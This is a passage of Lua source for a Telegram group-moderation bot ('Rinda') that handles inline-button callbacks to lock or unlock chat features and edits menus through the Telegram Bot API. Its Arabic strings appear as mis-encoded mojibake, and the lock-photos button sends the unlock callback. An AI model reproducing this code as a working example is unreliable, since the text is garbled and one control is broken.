if DataText and DataText:match('/DelAllFilter:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelAllFilter:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Filters:'..data.chat_id_)
DevRio:del(Rinda.."Rio:FilterAnimation"..data.chat_id_)
DevRio:del(Rinda.."Rio:FilterPhoto"..data.chat_id_)
DevRio:del(Rinda.."Rio:FilterSteckr"..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุฌููุน ููุงุฆู ุงูููุน ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑุฌูุน โข",callback_data="/FilterList:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/locklist:(.*)') then
local Rio = DataText:match('/locklist:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local locklist = DevRio:get(Rinda..'Rio:locklist')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูููู ูุงููุชุญ โขโฏ
-----------------------------------------
*โ๏ธฐููููู ูุชุญ ู ููู ุงูุงูุงูุฑ ูู ุฎูุงู ุงูุงุฒุฑุงุฑ ุงุณูู*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ููู ุงูุฏุฑุฏุดู โข",callback_data="/lockText:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุฏุฑุฏุดู โข",callback_data="/unlockText:"..data.sender_user_id_}},{{text="โข ููู ุงูุฏุฎูู โข",callback_data="/lockjoin:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุฏุฎูู โข",callback_data="/unlockjoin:"..data.sender_user_id_}},{{text="โข ููู ุงูุจูุชุงุช โข",callback_data="/LockBotList:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุจูุชุงุช โข",callback_data="/unlockBot:"..data.sender_user_id_}},{{text="โข ููู ุงูุงุดุนุงุฑุงุช โข",callback_data="/lockTagServr:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุงุดุนุงุฑุงุช โข",callback_data="/unlockTagServr:"..data.sender_user_id_}},{{text="โข ููู ุงูุชุนุฏูู โข",callback_data="/lockEditMsgs:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุชุนุฏูู โข",callback_data="/unlockEditMsgs:"..data.sender_user_id_}},{{text="โข ููู ุงูููุตูุงุช โข",callback_data="/lockStickers:"..data.sender_user_id_},{text="โข ูุชุญ ุงูููุตูุงุช โข",callback_data="/unlockStickers:"..data.sender_user_id_}},{{text="โข ููู ุงููุชุญุฑูู โข",callback_data="/lockGifs:"..data.sender_user_id_},{text="โข ูุชุญ ุงููุชุญุฑูู โข",callback_data="/unlockGifs:"..data.sender_user_id_}},{{text="โข ููู ุงูููุฏูู โข",callback_data="/lockVideos:"..data.sender_user_id_},{text="โข ูุชุญ ุงูููุฏูู โข",callback_data="/unlockVideos:"..data.sender_user_id_}},{{text="โข ููู ุงูุตูุฑ โข",callback_data="/unlockPhoto:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุตูุฑ โข",callback_data="/unlockPhoto:"..data.sender_user_id_}},{{text="โข ููู ุงูุชูุฌูู โข",callback_data="/lockForwards:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุชูุฌูู โข",callback_data="/unlockForwards:"..data.sender_user_id_}},{{text="โข ููู ุงูุชูุฑุงุฑ โข",callback_data="/LockSpamList:"..data.sender_user_id_},{text="โข ูุชุญ ุงูุชูุฑุงุฑ โข",callback_data="/unlockSpam:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/HelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/LockBotList:(.*)') then
local Rio = DataText:match('/LockBotList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local LockBotList = DevRio:get(Rinda..'Rio:LockBotList')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ููู ุงูุจูุชุงุช  โขโฏ
-----------------------------------------
*โ๏ธฐุจุงูุทุฑุฏ*
*โ๏ธฐุจุงููุชู*
*โ๏ธฐุจุงูุชููุฏ*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ููู ุงูุจูุชุงุช ุจุงูุทุฑุฏ โข",callback_data="/lockBotKick:"..data.sender_user_id_},{text="โข ููู ุงูุจูุชุงุช ุจุงูุชููุฏ โข",callback_data="/lockBotKed:"..data.sender_user_id_}},{{text="โข ููู ุงูุจูุชุงุช ุจุงููุชู โข",callback_data="/lockBotDel:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/LockSpamList:(.*)') then
local Rio = DataText:match('/LockSpamList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local LockSpamList = DevRio:get(Rinda..'Rio:LockSpamList')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ููู ุงูุชูุฑุงุฑ  โขโฏ
-----------------------------------------
*โ๏ธฐุจุงูุทุฑุฏ*
*โ๏ธฐุจุงููุชู*
*โ๏ธฐุจุงูุชููุฏ*
*โ๏ธฐุจุงูุญุฐู*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ููู ุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ โข",callback_data="/lockSpamKick:"..data.sender_user_id_},{text="โข ููู ุงูุชูุฑุงุฑ ุจุงูุชููุฏ โข",callback_data="/lockSpamKed:"..data.sender_user_id_}},{{text="โข ููู ุงูุชูุฑุงุฑ ุจุงูุญุฐู โข",callback_data="/lockSpamDel:"..data.sender_user_id_},{text="โข ููู ุงูุชูุฑุงุฑ ุจุงููุชู โข",callback_data="/lockSpamMute:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText == '/lockjoin:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:Join'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:Join'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงูุฏุฎูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockjoin:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:Join'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:Join'..data.chat_id_)
Text = "*โ๏ธฐุชู ูุชุญ ุงูุฏุฎูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockText:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:Text'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:Text'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงูุฏุฑุฏุดู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockText:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:Text'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:Text'..data.chat_id_)
Text = "*โ๏ธฐุชู ูุชุญ ุงูุฏุฑุฏุดู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockTagServr:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:TagServr'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:TagServr'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงูุงุดุนุงุฑุงุช ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockTagServr:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:TagServr'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:TagServr'..data.chat_id_) 
Text = "*โ๏ธฐุชู ูุชุญ ุงูุงุดุนุงุฑุงุช ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockEditMsgs:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:EditMsgs'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:EditMsgs'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงูุชุนุฏูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockEditMsgs:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:EditMsgs'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:EditMsgs'..data.chat_id_)
Text = "*โ๏ธฐุชู ูุชุญ ุงูุชุนุฏูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockStickers:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:Stickers'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:Stickers'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงูููุตูุงุช ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockStickers:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:Stickers'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:Stickers'..data.chat_id_)
Text = "*โ๏ธฐุชู ูุชุญ ุงูููุตูุงุช ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockGifs:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:Gifs'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:Gifs'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงููุชุญุฑูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockGifs:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:Gifs'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:Gifs'..data.chat_id_)
Text = "*โ๏ธฐุชู ูุชุญ ุงููุชุญุฑูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockPhoto:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:Photo'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:Photo'..data.chat_id_,true) 
Text = "*โ๏ธฐุชู ููู ุงูุตูุฑ ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockPhoto:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:Photo'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:Photo'..data.chat_id_)
Text = "*โ๏ธฐุชู ูุชุญ ุงูุตูุฑ ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockVideos:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:Videos'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:Videos'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงูููุฏูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockVideos:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:Videos'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:Videos'..data.chat_id_)
Text = "*โ๏ธฐุชู ูุชุญ ุงูููุฏูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockForwards:'..data.sender_user_id_ then
if not DevRio:get(Rinda..'Rio:Lock:Forwards'..data.chat_id_) then
DevRio:set(Rinda..'Rio:Lock:Forwards'..data.chat_id_,true)
Text = "*โ๏ธฐุชู ููู ุงูุชูุฌูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockForwards:'..data.sender_user_id_ then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..data.chat_id_) then
DevRio:del(Rinda..'Rio:Lock:Forwards'..data.chat_id_) 
Text = "*โ๏ธฐุชู ูุชุญ ุงูุชูุฌูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText == '/lockBotKick:'..data.sender_user_id_ then
DevRio:set(Rinda.."Rio:Lock:Bots"..data.chat_id_,"kick")  
Text = "*โ๏ธฐุชู ููู ุงูุจูุชุงุช ุจุงูุทุฑุฏ ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/LockBotList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockBotKed:'..data.sender_user_id_ then
DevRio:set(Rinda.."Rio:Lock:Bots"..data.chat_id_,"ked")   
Text = "*โ๏ธฐุชู ููู ุงูุจูุชุงุช ุจุงูุชูููุฏ ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/LockBotList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockBotDel:'..data.sender_user_id_ then
DevRio:set(Rinda.."Rio:Lock:Bots"..data.chat_id_,"del")  
Text = "*โ๏ธฐุชู ููู ุงูุจูุชุงุช ุจุงููุชู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/LockBotList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
if DataText == '/unlockBot:'..data.sender_user_id_ then
DevRio:del(Rinda.."Rio:Lock:Bots"..data.chat_id_) 
Text = "*โ๏ธฐุชู ูุชุญ ุงูุจูุชุงุช ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/locklist:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockSpamKick:'..data.sender_user_id_ then
DevRio:hset(Rinda.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","kick")  
Text = "*โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/LockSpamList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockSpamKed:'..data.sender_user_id_ then
DevRio:hset(Rinda.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","keed")  
Text = "*โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงูุชููุฏ ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/LockSpamList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockSpamDel:'..data.sender_user_id_ then
DevRio:hset(Rinda.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","del")  
Text = "*โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงูุญุฐู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/LockSpamList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
if DataText == '/lockSpamMute:'..data.sender_user_id_ then
DevRio:hset(Rinda.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","mute")  
Text = "*โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงููุชู ุถูุนู*"
keyboard = {} 
